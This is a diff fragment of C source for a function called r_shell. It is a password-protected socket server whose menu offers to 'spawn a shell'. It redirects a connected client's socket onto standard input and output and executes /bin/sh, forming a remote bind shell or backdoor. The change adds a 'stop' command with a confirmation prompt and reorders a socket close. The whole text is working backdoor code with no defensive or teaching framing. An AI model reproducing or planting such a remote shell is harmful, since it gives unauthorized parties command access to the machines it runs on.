@@ -81,7 +81,7 @@ int r_shell(void)
 	char hello_msg[] = "Password: ";
 	char conn_refused_msg[] = "Connexion refused\n";
 	char welcome_msg[] = "Welcome !\nCommands:\n\tshell:\tspawn a shell\n\tstop:\tstop server\n>: ";
-	//char confirm_msg[] = "Are you sure ? (y - n): ";
+	char confirm_msg[] = "Are you sure ? (y - n): ";
 
 	for (int i = 0; i < MAX_CLIENTS; ++i)
 	{
@@ -219,11 +219,31 @@ int r_shell(void)
 							dup2(clients_sockets[i], 0);
 							dup2(clients_sockets[i], 1);
 							dup2(clients_sockets[i], 2);
+							close(clients_sockets[i]);
 							char * const argv[] = {"/bin/sh", NULL};
 							execve("/bin/sh", argv, NULL);
-							close(clients_sockets[i]);
+							// execve only return in case of trouble 
 							clients_sockets[i] = 0;
 							exit(EXIT_FAILURE);
+						}
+					} 
+					else if (strncmp(buffer, "stop", 4) == 0)
+					{
+						send(clients_sockets[i], confirm_msg, strlen(confirm_msg), 0);
+						if (read(clients_sockets[i], buffer, 1024) < 0)
+						{
+							printf("error reading socket content\n");
+							close(master_sd);
+							return -1;
+						}
+						if (strncmp(buffer, "y", 1) == 0)
+						{
+							for (int i = 0; i < MAX_CLIENTS; ++i)
+							{
+								close(clients_sockets[i]);
+							}
+							close(master_sd);
+							return 1;
 						}
 					}
 					// echo
